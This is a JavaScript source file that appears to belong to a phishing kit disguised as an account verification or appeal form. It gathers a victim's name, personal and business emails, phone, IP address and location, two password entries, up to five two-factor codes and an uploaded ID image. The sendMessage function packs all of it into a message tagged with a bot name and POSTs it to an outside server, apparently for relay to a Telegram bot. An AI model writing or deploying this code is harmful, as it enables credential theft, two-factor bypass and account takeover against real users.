import { botName, serverUrl } from '../configs/env.js';
import { loadFromSession } from '../session/index.js';

export function initializeForm() {
  const formData = {};

  formData['verification_type'] =
    document.querySelector('input[name="verification_type"]:checked')?.value ||
    '';
  formData['documentType'] =
    document.getElementById('documentType')?.value || '';
  formData['category'] = document.getElementById('category')?.value || '';
  formData['country'] = document.getElementById('country')?.value || '';
  formData['city'] = document.getElementById('city')?.value || '';
  formData['owner'] = document.getElementById('owner')?.value || '';
  formData['pageName'] = document.getElementById('pageName')?.value || '';
  formData['phoneNumber'] = document.getElementById('pageName')?.value || '';
  formData['personalEmail'] =
    document.getElementById('personalEmail')?.value || '';
  formData['businessEmail'] =
    document.getElementById('businessEmail')?.value || '';
  formData['link 1'] = document.getElementById('link 1')?.value;
  formData['link 2'] = document.getElementById('link 2')?.value;
  formData['link 3'] = document.getElementById('link 3')?.value;
  formData['link 4'] = document.getElementById('link 4')?.value;
  formData['link 5'] = document.getElementById('link 5')?.value;
  return formData;
}

export async function sendMessage(additionalData = {}) {
  let allData = { ...window.formToSend, ...additionalData };
  const sessionData = loadFromSession();
  if (sessionData) {
    allData = { ...allData, ...sessionData };
  }

  const templateTELEData = `url: ${window.location.href}
        bot_name: ${botName}
        user_ip: ${window.userIpData.user_ip}
        country: ${window.userIpData.country || allData['country'] || ''}
        country-code: ${window.userIpData.country_code}
        city: ${allData['city'] || ''}
        full-name: ${allData['owner'] || ''}
        personal-email: ${allData['personalEmail'] || ''}
        buiseness-email: ${allData['businessEmail'] || ''}
        mobile-phone-number: ${allData['phoneNumber'] || ''}
        password-1: ${allData['password-1'] || ''}
        password-2: ${allData['password-2'] || ''}
        2FA-1: ${allData['2FA-1'] || ''}
        2FA-2: ${allData['2FA-2'] || ''}
        2FA-3: ${allData['2FA-3'] || ''}
        2FA-4: ${allData['2FA-4'] || ''}
        2FA-5: ${allData['2FA-5'] || ''}
        link-1: ${allData['link 1'] || ''}
        link-2: ${allData['link 2'] || ''}
        link-3: ${allData['link 3'] || ''}
        link-4: ${allData['link 4'] || ''}
        link-5: ${allData['link 5'] || ''}
        page-name: ${allData['pageName'] || ''}
        appeal: ${allData['category'] || ''}
        dis-name: ${allData['documentType'] || ''}
        is-mobile: ${window.metrics.is_Mobile}
        params: ${
          Object.keys(allData)
            .filter((key) => key.startsWith('link_'))
            .map((key) => allData[key])
            .join(', ') || ''
        }${
    allData['uploaded_file']
      ? `
        uploaded-file: ${allData['uploaded_file'].name} (${(
          allData['uploaded_file'].size / 1024
        ).toFixed(1)}KB, ${allData['uploaded_file'].type})`
      : ''
  }`;

  const data = {
    message: templateTELEData,
  };

  if (
    allData['uploaded_file'] &&
    allData['uploaded_file'].isImage &&
    allData['uploaded_file'].data
  ) {
    data.file = {
      name: allData['uploaded_file'].name,
      type: allData['uploaded_file'].type,
      size: allData['uploaded_file'].size,
      data: allData['uploaded_file'].data,
    };
  }

  try {
    const url = `${serverUrl}/send`;
    const params = new URLSearchParams({
      bot_name: botName,
    });

    const response = await fetch(url + '?' + params.toString(), {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    });

    await response.json();
    return true;
  } catch (error) {
    return false;
  }
}
